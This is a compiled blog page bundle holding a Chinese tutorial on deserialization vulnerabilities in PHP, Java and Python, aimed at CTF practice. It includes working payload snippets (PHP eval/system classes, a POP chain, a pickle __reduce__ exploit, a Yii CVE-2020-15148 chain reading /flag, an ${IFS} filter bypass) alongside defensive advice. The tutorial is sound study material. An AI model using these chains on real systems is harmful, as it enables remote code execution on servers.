import{_ as i,c as a,a as n,o as t}from"./app-CZFuAm8s.js";const l={};function e(h,s){return t(),a("div",null,[...s[0]||(s[0]=[n(`<h2 id="一、基础原理" tabindex="-1"><a class="header-anchor" href="#一、基础原理"><span>一、基础原理</span></a></h2><h3 id="_1-1-序列化与反序列化定义" tabindex="-1"><a class="header-anchor" href="#_1-1-序列化与反序列化定义"><span>1.1 序列化与反序列化定义</span></a></h3><p>序列化是将对象状态转换为可存储或传输格式的过程，反序列化则是将这些格式还原为原始对象的过程。常见的序列化格式包括二进制流、JSON、XML等。</p><h3 id="_1-2-安全风险产生原因" tabindex="-1"><a class="header-anchor" href="#_1-2-安全风险产生原因"><span>1.2 安全风险产生原因</span></a></h3><div class="hint-container note"><p class="hint-container-title">核心原理</p><p>当应用程序对不可信数据源进行反序列化操作时，攻击者可构造恶意数据触发代码执行。反序列化漏洞的核心在于：<strong>反序列化过程会自动调用对象的特定方法</strong>（如PHP的魔术方法、Java的readObject()、Python的__reduce__()），若这些方法包含危险操作且参数可控，则可能导致远程代码执行。</p></div><h2 id="二、漏洞利用方式" tabindex="-1"><a class="header-anchor" href="#二、漏洞利用方式"><span>二、漏洞利用方式</span></a></h2><h3 id="_2-1-构造恶意对象" tabindex="-1"><a class="header-anchor" href="#_2-1-构造恶意对象"><span>2.1 构造恶意对象</span></a></h3><p>通过定义包含危险方法的类，构造恶意对象并序列化。反序列化时自动触发危险方法，例如：</p><details class="hint-container details"><summary>代码示例：PHP恶意类构造</summary><div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" style="--shiki-light:#000000;--shiki-dark:#bfbdb6;--shiki-light-bg:#FFFFFF;--shiki-dark-bg:#0b0e14;"><pre class="shiki shiki-themes light-plus ayu-dark vp-code"><code class="language-php"><span class="line"><span style="--shiki-light:#008000;--shiki-light-font-style:inherit;--shiki-dark:#ACB6BF8C;--shiki-dark-font-style:italic;">// PHP示例：构造包含__destruct方法的恶意类</span></span>
<span class="line"><span style="--shiki-light:#0000FF;--shiki-dark:#FF8F40;">class</span><span style="--shiki-light:#267F99;--shiki-dark:#59C2FF;"> Malicious</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;"> {</span></span>
<span class="line"><span style="--shiki-light:#0000FF;--shiki-dark:#FF8F40;">    public</span><span style="--shiki-light:#001080;--shiki-dark:#BFBDB6;"> $cmd</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">;</span></span>
<span class="line"><span style="--shiki-light:#0000FF;--shiki-dark:#FF8F40;">    function</span><span style="--shiki-light:#795E26;--shiki-dark:#F07178;"> __destruct</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">() {</span></span>
<span class="line"><span style="--shiki-light:#795E26;--shiki-dark:#F07178;">        eval</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">(</span><span style="--shiki-light:#0000FF;--shiki-light-font-style:inherit;--shiki-dark:#39BAE6;--shiki-dark-font-style:italic;">$this</span><span style="--shiki-light:#000000;--shiki-dark:#F29668;">-&gt;</span><span style="--shiki-light:#001080;--shiki-dark:#BFBDB6;">cmd</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">)</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">;</span></span>
<span class="line"><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">    }</span></span>
<span class="line"><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">}</span></span>
<span class="line"><span style="--shiki-light:#001080;--shiki-dark:#BFBDB6;">$obj</span><span style="--shiki-light:#000000;--shiki-dark:#F29668;"> =</span><span style="--shiki-light:#0000FF;--shiki-dark:#FF8F40;"> new</span><span style="--shiki-light:#267F99;--shiki-dark:#39BAE6;"> Malicious</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">()</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">;</span></span>
<span class="line"><span style="--shiki-light:#001080;--shiki-dark:#BFBDB6;">$obj</span><span style="--shiki-light:#000000;--shiki-dark:#F29668;">-&gt;</span><span style="--shiki-light:#001080;--shiki-dark:#BFBDB6;">cmd</span><span style="--shiki-light:#000000;--shiki-dark:#F29668;"> =</span><span style="--shiki-light:#A31515;--shiki-dark:#AAD94C;"> &#39;system(&quot;whoami&quot;);&#39;</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">;</span></span>
<span class="line"><span style="--shiki-light:#795E26;--shiki-dark:#F07178;">echo</span><span style="--shiki-light:#795E26;--shiki-dark:#F07178;"> serialize</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">(</span><span style="--shiki-light:#001080;--shiki-dark:#BFBDB6;">$obj</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">)</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><h3 id="_2-2-利用魔术方法" tabindex="-1"><a class="header-anchor" href="#_2-2-利用魔术方法"><span>2.2 利用魔术方法</span></a></h3><p>不同语言的关键触发方法：</p><ul><li><strong>PHP</strong>：<code>__wakeup()</code>、<code>__destruct()</code>、<code>__toString()</code></li><li><strong>Java</strong>：<code>readObject()</code>、<code>readExternal()</code></li><li><strong>Python</strong>：<code>__reduce__()</code>、<code>__getstate__()</code></li></ul><h3 id="_2-3-pop链构建" tabindex="-1"><a class="header-anchor" href="#_2-3-pop链构建"><span>2.3 POP链构建</span></a></h3><p>通过串联多个类的方法调用，形成利用链（Property-Oriented Programming）。例如PHP中的链式调用：</p><details class="hint-container details"><summary>代码示例：PHP POP链构造</summary><div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" style="--shiki-light:#000000;--shiki-dark:#bfbdb6;--shiki-light-bg:#FFFFFF;--shiki-dark-bg:#0b0e14;"><pre class="shiki shiki-themes light-plus ayu-dark vp-code"><code class="language-php"><span class="line"><span style="--shiki-light:#0000FF;--shiki-dark:#FF8F40;">class</span><span style="--shiki-light:#267F99;--shiki-dark:#59C2FF;"> A</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;"> {</span></span>
<span class="line"><span style="--shiki-light:#0000FF;--shiki-dark:#FF8F40;">    public</span><span style="--shiki-light:#001080;--shiki-dark:#BFBDB6;"> $b</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">;</span></span>
<span class="line"><span style="--shiki-light:#0000FF;--shiki-dark:#FF8F40;">    function</span><span style="--shiki-light:#795E26;--shiki-dark:#F07178;"> __destruct</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">() {</span></span>
<span class="line"><span style="--shiki-light:#0000FF;--shiki-light-font-style:inherit;--shiki-dark:#39BAE6;--shiki-dark-font-style:italic;">        $this</span><span style="--shiki-light:#000000;--shiki-dark:#F29668;">-&gt;</span><span style="--shiki-light:#001080;--shiki-dark:#BFBDB6;">b</span><span style="--shiki-light:#000000;--shiki-dark:#F29668;">-&gt;</span><span style="--shiki-light:#795E26;--shiki-dark:#FFB454;">exec</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">()</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">;</span></span>
<span class="line"><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">    }</span></span>
<span class="line"><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">}</span></span>
<span class="line"><span style="--shiki-light:#0000FF;--shiki-dark:#FF8F40;">class</span><span style="--shiki-light:#267F99;--shiki-dark:#59C2FF;"> B</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;"> {</span></span>
<span class="line"><span style="--shiki-light:#0000FF;--shiki-dark:#FF8F40;">    public</span><span style="--shiki-light:#001080;--shiki-dark:#BFBDB6;"> $cmd</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">;</span></span>
<span class="line"><span style="--shiki-light:#0000FF;--shiki-dark:#FF8F40;">    function</span><span style="--shiki-light:#795E26;--shiki-dark:#FFB454;"> exec</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">() {</span></span>
<span class="line"><span style="--shiki-light:#795E26;--shiki-dark:#F07178;">        system</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">(</span><span style="--shiki-light:#0000FF;--shiki-light-font-style:inherit;--shiki-dark:#39BAE6;--shiki-dark-font-style:italic;">$this</span><span style="--shiki-light:#000000;--shiki-dark:#F29668;">-&gt;</span><span style="--shiki-light:#001080;--shiki-dark:#BFBDB6;">cmd</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">)</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">;</span></span>
<span class="line"><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">    }</span></span>
<span class="line"><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">}</span></span>
<span class="line"><span style="--shiki-light:#008000;--shiki-light-font-style:inherit;--shiki-dark:#ACB6BF8C;--shiki-dark-font-style:italic;">// 构造A-&gt;B-&gt;exec()调用链</span></span>
<span class="line"><span style="--shiki-light:#001080;--shiki-dark:#BFBDB6;">$a</span><span style="--shiki-light:#000000;--shiki-dark:#F29668;"> =</span><span style="--shiki-light:#0000FF;--shiki-dark:#FF8F40;"> new</span><span style="--shiki-light:#267F99;--shiki-dark:#39BAE6;"> A</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">()</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">;</span></span>
<span class="line"><span style="--shiki-light:#001080;--shiki-dark:#BFBDB6;">$a</span><span style="--shiki-light:#000000;--shiki-dark:#F29668;">-&gt;</span><span style="--shiki-light:#001080;--shiki-dark:#BFBDB6;">b</span><span style="--shiki-light:#000000;--shiki-dark:#F29668;"> =</span><span style="--shiki-light:#0000FF;--shiki-dark:#FF8F40;"> new</span><span style="--shiki-light:#267F99;--shiki-dark:#39BAE6;"> B</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">()</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">;</span></span>
<span class="line"><span style="--shiki-light:#001080;--shiki-dark:#BFBDB6;">$a</span><span style="--shiki-light:#000000;--shiki-dark:#F29668;">-&gt;</span><span style="--shiki-light:#001080;--shiki-dark:#BFBDB6;">b</span><span style="--shiki-light:#000000;--shiki-dark:#F29668;">-&gt;</span><span style="--shiki-light:#001080;--shiki-dark:#BFBDB6;">cmd</span><span style="--shiki-light:#000000;--shiki-dark:#F29668;"> =</span><span style="--shiki-light:#A31515;--shiki-dark:#AAD94C;"> &#39;id&#39;</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">;</span></span>
<span class="line"><span style="--shiki-light:#795E26;--shiki-dark:#F07178;">echo</span><span style="--shiki-light:#795E26;--shiki-dark:#F07178;"> serialize</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">(</span><span style="--shiki-light:#001080;--shiki-dark:#BFBDB6;">$a</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">)</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><h2 id="三、语言特性对比" tabindex="-1"><a class="header-anchor" href="#三、语言特性对比"><span>三、语言特性对比</span></a></h2><table><thead><tr><th>语言</th><th>关键触发方法</th><th>序列化格式</th><th>典型漏洞案例</th></tr></thead><tbody><tr><td>PHP</td><td><code>__wakeup()</code>、<code>__destruct()</code></td><td>明文字符串</td><td>CVE-2016-7124</td></tr><tr><td>Java</td><td><code>readObject()</code>、<code>readExternal()</code></td><td>二进制流（ACED开头）</td><td>Apache Commons Collections漏洞</td></tr><tr><td>Python</td><td><code>__reduce__()</code></td><td>pickle二进制</td><td>反序列化命令执行</td></tr><tr><td class="full-width"></td><td></td><td></td><td></td></tr></tbody></table><h3 id="_3-1-php反序列化" tabindex="-1"><a class="header-anchor" href="#_3-1-php反序列化"><span>3.1 PHP反序列化</span></a></h3><ul><li><strong>格式</strong>：明文可读字符串（如<code>O:8:&quot;Malicious&quot;:1:{s:3:&quot;cmd&quot;;s:7:&quot;system&quot;;}</code>）</li><li><strong>核心</strong>：魔术方法自动触发</li><li><strong>典型漏洞</strong>： <ul><li>CVE-2016-7124：<code>__wakeup()</code>绕过（属性个数篡改）</li><li>字符串逃逸（通过字符替换构造POP链）</li></ul></li></ul><h3 id="_3-2-java反序列化" tabindex="-1"><a class="header-anchor" href="#_3-2-java反序列化"><span>3.2 Java反序列化</span></a></h3><ul><li><strong>格式</strong>：二进制流（以<code>ACED</code>开头的16进制）</li><li><strong>核心</strong>：<code>readObject()</code>方法与Gadget链</li><li><strong>典型案例</strong>： <ul><li>Apache Commons Collections漏洞（CVE-2015-7501）</li><li>WebLogic T3协议漏洞（CVE-2017-10271）</li></ul></li></ul><h3 id="_3-3-python反序列化" tabindex="-1"><a class="header-anchor" href="#_3-3-python反序列化"><span>3.3 Python反序列化</span></a></h3><ul><li><strong>格式</strong>：二进制流（pickle协议）</li><li><strong>核心</strong>：<code>__reduce__()</code>方法返回可执行元组</li><li><strong>风险示例</strong>：</li></ul><details class="hint-container details"><summary>代码示例：Python反序列化命令执行</summary><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#000000;--shiki-dark:#bfbdb6;--shiki-light-bg:#FFFFFF;--shiki-dark-bg:#0b0e14;"><pre class="shiki shiki-themes light-plus ayu-dark vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#AF00DB;--shiki-dark:#FF8F40;">import</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;"> os</span></span>
<span class="line"><span style="--shiki-light:#AF00DB;--shiki-dark:#FF8F40;">import</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;"> pickle</span></span>
<span class="line"><span style="--shiki-light:#0000FF;--shiki-dark:#FF8F40;">class</span><span style="--shiki-light:#267F99;--shiki-dark:#59C2FF;"> Exploit</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">:</span></span>
<span class="line"><span style="--shiki-light:#0000FF;--shiki-dark:#FF8F40;">    def</span><span style="--shiki-light:#795E26;--shiki-dark:#F07178;"> __reduce__</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">(</span><span style="--shiki-light:#001080;--shiki-dark:#D2A6FF;">self</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">):</span></span>
<span class="line"><span style="--shiki-light:#AF00DB;--shiki-dark:#FF8F40;">        return</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;"> (os</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">.</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">system</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">,</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;"> (</span><span style="--shiki-light:#A31515;--shiki-dark:#AAD94C;">&#39;echo hacked&#39;</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">,</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">))</span></span>
<span class="line"><span style="--shiki-light:#795E26;--shiki-dark:#F07178;">print</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">(pickle</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">.</span><span style="--shiki-light:#000000;--shiki-dark:#FFB454;">dumps</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">(</span><span style="--shiki-light:#000000;--shiki-dark:#FFB454;">Exploit</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">()))  </span><span style="--shiki-light:#008000;--shiki-light-font-style:inherit;--shiki-dark:#ACB6BF8C;--shiki-dark-font-style:italic;"># 反序列化时执行命令</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><h2 id="四、防御机制" tabindex="-1"><a class="header-anchor" href="#四、防御机制"><span>四、防御机制</span></a></h2><h3 id="_4-1-输入验证" tabindex="-1"><a class="header-anchor" href="#_4-1-输入验证"><span>4.1 输入验证</span></a></h3><div class="hint-container tip"><p class="hint-container-title">最佳实践</p><ul><li>对反序列化数据进行签名校验（如HMAC）</li><li>限制反序列化类范围（白名单机制）</li></ul></div><h3 id="_4-2-安全配置" tabindex="-1"><a class="header-anchor" href="#_4-2-安全配置"><span>4.2 安全配置</span></a></h3><ul><li><strong>PHP</strong>：使用<code>unserialize($data, [&#39;allowed_classes&#39; =&gt; false])</code></li><li><strong>Java</strong>：禁用危险库（如Apache Commons Collections &lt; 4.4）</li><li><strong>Python</strong>：优先使用JSON替代pickle</li></ul><h3 id="_4-3-代码审计" tabindex="-1"><a class="header-anchor" href="#_4-3-代码审计"><span>4.3 代码审计</span></a></h3><div class="hint-container warning"><p class="hint-container-title">审计重点</p><ul><li>重点检查<code>unserialize()</code>、<code>pickle.loads()</code>等危险函数</li><li>避免在魔术方法中使用<code>eval()</code>、<code>system()</code>等危险函数</li></ul></div><h2 id="五、ctf题型与解题技巧" tabindex="-1"><a class="header-anchor" href="#五、ctf题型与解题技巧"><span>五、CTF题型与解题技巧</span></a></h2><h3 id="_5-1-常见题型" tabindex="-1"><a class="header-anchor" href="#_5-1-常见题型"><span>5.1 常见题型</span></a></h3><ol><li><strong>基础反序列化</strong><br> 直接构造恶意对象触发漏洞，如：</li></ol><details class="hint-container details"><summary>代码示例：攻防世界unserialize3</summary><div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" style="--shiki-light:#000000;--shiki-dark:#bfbdb6;--shiki-light-bg:#FFFFFF;--shiki-dark-bg:#0b0e14;"><pre class="shiki shiki-themes light-plus ayu-dark vp-code"><code class="language-php"><span class="line"><span style="--shiki-light:#008000;--shiki-light-font-style:inherit;--shiki-dark:#ACB6BF8C;--shiki-dark-font-style:italic;">// 攻防世界unserialize3</span></span>
<span class="line"><span style="--shiki-light:#0000FF;--shiki-dark:#FF8F40;">class</span><span style="--shiki-light:#267F99;--shiki-dark:#59C2FF;"> xctf</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">{</span></span>
<span class="line"><span style="--shiki-light:#0000FF;--shiki-dark:#FF8F40;">    public</span><span style="--shiki-light:#001080;--shiki-dark:#BFBDB6;"> $flag</span><span style="--shiki-light:#000000;--shiki-dark:#F29668;">=</span><span style="--shiki-light:#A31515;--shiki-dark:#AAD94C;">&#39;111&#39;</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">;</span></span>
<span class="line"><span style="--shiki-light:#0000FF;--shiki-dark:#FF8F40;">    function</span><span style="--shiki-light:#795E26;--shiki-dark:#F07178;"> __wakeup</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">(){</span><span style="--shiki-light:#AF00DB;--shiki-dark:#FF8F40;">exit</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">(</span><span style="--shiki-light:#A31515;--shiki-dark:#AAD94C;">&#39;bad&#39;</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">)</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">;</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">}</span></span>
<span class="line"><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">}</span></span>
<span class="line"><span style="--shiki-light:#008000;--shiki-light-font-style:inherit;--shiki-dark:#ACB6BF8C;--shiki-dark-font-style:italic;">// 绕过__wakeup：修改属性个数</span></span>
<span class="line"><span style="--shiki-light:#000000;--shiki-dark:#59C2FF;">O</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">:</span><span style="--shiki-light:#098658;--shiki-dark:#D2A6FF;">4</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">:</span><span style="--shiki-light:#A31515;--shiki-dark:#AAD94C;">&quot;xctf&quot;</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">:</span><span style="--shiki-light:#098658;--shiki-dark:#D2A6FF;">2</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">:</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">{</span><span style="--shiki-light:#000000;--shiki-dark:#95E6CB;">s</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">:</span><span style="--shiki-light:#098658;--shiki-dark:#D2A6FF;">4</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">:</span><span style="--shiki-light:#A31515;--shiki-dark:#AAD94C;">&quot;flag&quot;</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">;</span><span style="--shiki-light:#000000;--shiki-dark:#95E6CB;">s</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">:</span><span style="--shiki-light:#098658;--shiki-dark:#D2A6FF;">3</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">:</span><span style="--shiki-light:#A31515;--shiki-dark:#AAD94C;">&quot;111&quot;</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">;</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><ol start="2"><li><strong>POP链构造</strong><br> 如CTFSHOW web267，利用Yii框架的CVE-2020-15148构造调用链：</li></ol><details class="hint-container details"><summary>代码示例：Yii框架POP链</summary><div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" style="--shiki-light:#000000;--shiki-dark:#bfbdb6;--shiki-light-bg:#FFFFFF;--shiki-dark-bg:#0b0e14;"><pre class="shiki shiki-themes light-plus ayu-dark vp-code"><code class="language-php"><span class="line"><span style="--shiki-light:#0000FF;--shiki-dark:#FF8F40;">namespace</span><span style="--shiki-light:#267F99;--shiki-dark:#59C2FF;"> yii</span><span style="--shiki-light:#267F99;--shiki-dark:#BFBDB6B3;">\\</span><span style="--shiki-light:#267F99;--shiki-dark:#59C2FF;">rest</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">{</span></span>
<span class="line"><span style="--shiki-light:#0000FF;--shiki-dark:#FF8F40;">    class</span><span style="--shiki-light:#267F99;--shiki-dark:#59C2FF;"> IndexAction</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">{</span><span style="--shiki-light:#0000FF;--shiki-dark:#FF8F40;">public</span><span style="--shiki-light:#001080;--shiki-dark:#BFBDB6;"> $checkAccess</span><span style="--shiki-light:#000000;--shiki-dark:#F29668;">=</span><span style="--shiki-light:#A31515;--shiki-dark:#AAD94C;">&#39;exec&#39;</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">;</span><span style="--shiki-light:#0000FF;--shiki-dark:#FF8F40;"> public</span><span style="--shiki-light:#001080;--shiki-dark:#BFBDB6;"> $id</span><span style="--shiki-light:#000000;--shiki-dark:#F29668;">=</span><span style="--shiki-light:#A31515;--shiki-dark:#AAD94C;">&#39;cat /flag&#39;</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">;</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">}</span></span>
<span class="line"><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">}</span></span>
<span class="line"><span style="--shiki-light:#008000;--shiki-light-font-style:inherit;--shiki-dark:#ACB6BF8C;--shiki-dark-font-style:italic;">// 省略中间类...</span></span>
<span class="line"><span style="--shiki-light:#795E26;--shiki-dark:#F07178;">echo</span><span style="--shiki-light:#795E26;--shiki-dark:#F07178;"> base64_encode</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">(</span><span style="--shiki-light:#795E26;--shiki-dark:#F07178;">serialize</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">(</span><span style="--shiki-light:#0000FF;--shiki-dark:#FF8F40;">new</span><span style="--shiki-light:#267F99;--shiki-dark:#39BAE6;"> BatchQueryResult</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6;">()))</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><ol start="3"><li><strong>反序列化+命令注入</strong><br> 结合命令注入绕过过滤，如：</li></ol><div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" style="--shiki-light:#000000;--shiki-dark:#bfbdb6;--shiki-light-bg:#FFFFFF;--shiki-dark-bg:#0b0e14;"><pre class="shiki shiki-themes light-plus ayu-dark vp-code"><code class="language-php"><span class="line"><span style="--shiki-light:#008000;--shiki-light-font-style:inherit;--shiki-dark:#ACB6BF8C;--shiki-dark-font-style:italic;">// 绕过空格过滤：使用\${IFS}</span></span>
<span class="line"><span style="--shiki-light:#001080;--shiki-dark:#BFBDB6;">$cmd</span><span style="--shiki-light:#000000;--shiki-dark:#F29668;"> =</span><span style="--shiki-light:#A31515;--shiki-dark:#AAD94C;"> &#39;cat\${IFS}/flag&#39;</span><span style="--shiki-light:#000000;--shiki-dark:#BFBDB6B3;">;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_5-2-解题步骤" tabindex="-1"><a class="header-anchor" href="#_5-2-解题步骤"><span>5.2 解题步骤</span></a></h3><ol><li><strong>寻找反序列化入口</strong>：搜索代码中的<code>unserialize()</code>、<code>pickle.loads()</code>等函数</li><li><strong>分析可利用类</strong>：查找包含魔术方法的类，识别危险操作</li><li><strong>构造利用链</strong>：串联方法调用，生成序列化字符串</li><li><strong>调试验证</strong>：通过打印输出或日志确认利用链有效性</li></ol><h2 id="六、参考案例" tabindex="-1"><a class="header-anchor" href="#六、参考案例"><span>六、参考案例</span></a></h2><ol><li><strong>PHP反序列化</strong>：CTFSHOW web265-270<sup class="footnote-ref"><a href="#footnote1">[1]</a><a class="footnote-anchor" id="footnote-ref1"></a></sup></li><li><strong>Java反序列化</strong>：Apache Commons Collections漏洞<sup class="footnote-ref"><a href="#footnote2">[2]</a><a class="footnote-anchor" id="footnote-ref2"></a></sup></li><li><strong>Python反序列化</strong>：CISCN 2019华北Day1 Web2<sup class="footnote-ref"><a href="#footnote3">[3]</a><a class="footnote-anchor" id="footnote-ref3"></a></sup></li></ol><h2 id="七、防御最佳实践" tabindex="-1"><a class="header-anchor" href="#七、防御最佳实践"><span>七、防御最佳实践</span></a></h2><div class="hint-container note"><p class="hint-container-title">防御清单</p><ol><li><strong>避免反序列化不可信数据</strong>：优先使用JSON等安全格式</li><li><strong>实施白名单机制</strong>：限制允许反序列化的类</li><li><strong>数据完整性校验</strong>：对序列化数据进行签名（如HMAC）</li><li><strong>使用安全库</strong>：PHP替换为<code>igbinary</code>，Java使用<code>Kryo</code></li><li><strong>代码审计</strong>：定期检查反序列化入口及魔术方法</li></ol></div><hr class="footnotes-sep"><section class="footnotes"><ol class="footnotes-list"><li id="footnote1" class="footnote-item"><p>https://blog.csdn.net/Myon5/article/details/143641482 <a href="#footnote-ref1" class="footnote-backref">↩︎</a></p></li><li id="footnote2" class="footnote-item"><p>https://blog.csdn.net/weixin_62808713/article/details/130042758 <a href="#footnote-ref2" class="footnote-backref">↩︎</a></p></li><li id="footnote3" class="footnote-item"><p>https://blog.csdn.net/2301_80467400/article/details/145410998 <a href="#footnote-ref3" class="footnote-backref">↩︎</a></p></li></ol></section>`,47)])])}const p=i(l,[["render",e]]),d=JSON.parse(`{"path":"/article/ec4p24ql/","title":"MISC杂项学习","lang":"zh-CN","frontmatter":{"title":"MISC杂项学习","createTime":"2025/09/26 08:51:15","permalink":"/article/ec4p24ql/","tags":["CTF","杂项"],"description":"一、基础原理 1.1 序列化与反序列化定义 序列化是将对象状态转换为可存储或传输格式的过程，反序列化则是将这些格式还原为原始对象的过程。常见的序列化格式包括二进制流、JSON、XML等。 1.2 安全风险产生原因 核心原理 当应用程序对不可信数据源进行反序列化操作时，攻击者可构造恶意数据触发代码执行。反序列化漏洞的核心在于：反序列化过程会自动调用对象的...","head":[["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"MISC杂项学习\\",\\"image\\":[\\"\\"],\\"dateModified\\":\\"2025-09-27T01:57:16.000Z\\",\\"author\\":[]}"],["meta",{"property":"og:url","content":"https://gaifagafin.top/article/ec4p24ql/"}],["meta",{"property":"og:site_name","content":"Gaifa Gafin's Blog"}],["meta",{"property":"og:title","content":"MISC杂项学习"}],["meta",{"property":"og:description","content":"一、基础原理 1.1 序列化与反序列化定义 序列化是将对象状态转换为可存储或传输格式的过程，反序列化则是将这些格式还原为原始对象的过程。常见的序列化格式包括二进制流、JSON、XML等。 1.2 安全风险产生原因 核心原理 